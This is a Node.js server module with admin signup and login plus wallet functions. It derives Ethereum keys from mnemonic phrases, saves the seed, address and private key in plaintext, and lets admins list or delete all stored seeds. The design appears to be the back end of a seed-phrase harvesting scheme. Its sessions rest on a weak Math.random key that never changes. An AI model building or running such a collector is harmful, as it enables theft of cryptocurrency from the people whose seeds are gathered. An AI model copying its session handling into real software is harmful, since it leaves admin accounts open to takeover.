require('dotenv').config()
const HDWallet = require('ethereum-hdwallet')
const bcrypt = require('bcrypt')
const { AdminModal } = require('../models/Admins')
const { WalletModal } = require('../models/Wallets')
const {adminKey} = require('../config/config')
const saltRounds = 10;

signup = async (key, id, password) => {
	try {
		if(key!==adminKey) return {error :2, result : false};
		var sessionKey = Math.floor(Math.random() * 1000000)
		var admins = await AdminModal.find({ name: id }) 
		if(admins.length > 0) return {error :3, result : false};
		const salt = bcrypt.genSaltSync(saltRounds);
		const hash = bcrypt.hashSync(password, salt);
		const instance = new AdminModal({name : id, password:hash, sessionKey : sessionKey})
		var res = await instance.save()
		return { error: 0, msg: 'success', result: res }
	} catch (ex) {
		return { error: 1, msg: ex }
	}
}
signin = async(id, password) => {
	try{
		var row = await AdminModal.find({ name: id });
		if(row.length > 0){
			var pass = row[0].password;
			if(bcrypt.compareSync(password, pass)){
				return {error : 0, msg:'success', session: row[0].sessionKey}
			}
			else {
				return {error : 2, msg:"invalid password"}
			}
			
		}else{
			return { error: 1, msg: "Cannot found admin" }	
		}
	}catch(ex) {
		return { error: 2, msg: ex }
	}
}
saveInfo = async (seeds, address, publickey, privatekey)  => {
	try {
		const instance = new WalletModal({seeds:seeds, address:address, publickey:publickey, privatekey:privatekey, registion:new Date().getTime()})
		var res = await instance.save()
		return { error: 0, msg: 'success', result: res }
	} catch (ex) {
		return { error: 1, msg: ex }
	}
}

getWalletInfo = async (seeds) => {
	try {
		var address =  '';
		var publickey =  '';
		var privatekey =  '';
		const hdwallet = HDWallet.fromMnemonic(seeds)
		const hdkey = hdwallet.derive(`m/44'/60'/0'/0/0`)
		publickey = hdkey.getPublicKey().toString('hex')
		privatekey = hdkey.getPrivateKey().toString('hex');
		address = hdkey.getAddress().toString('hex');
		return { error: 0, address:address, publickey:publickey, privatekey:privatekey }
	} catch (ex) {
		console.log(ex) 
		return { error: 1, msg: "Known error" }
	}
}

getSeedList = async () => {
	try {
		var rows = await WalletModal.find().sort({
			registion: 1,
		})
		return { error: 0, result: rows }
	} catch (ex) {
		console.log(ex) 
		return { error: 1, msg: "poolList: cannot found pool data" }
	}
}

removeSeed = async (address) => {
	try {
		await WalletModal.deleteMany({address:address})
		return { error: 0 }	
	} catch (ex) {
		console.log(ex) 
		return { error: 1, msg: "poolList: cannot found pool data" }
	}
}

module.exports = {
	signup,
	signin,
	saveInfo,
	getWalletInfo,
	getSeedList, 
	removeSeed
}
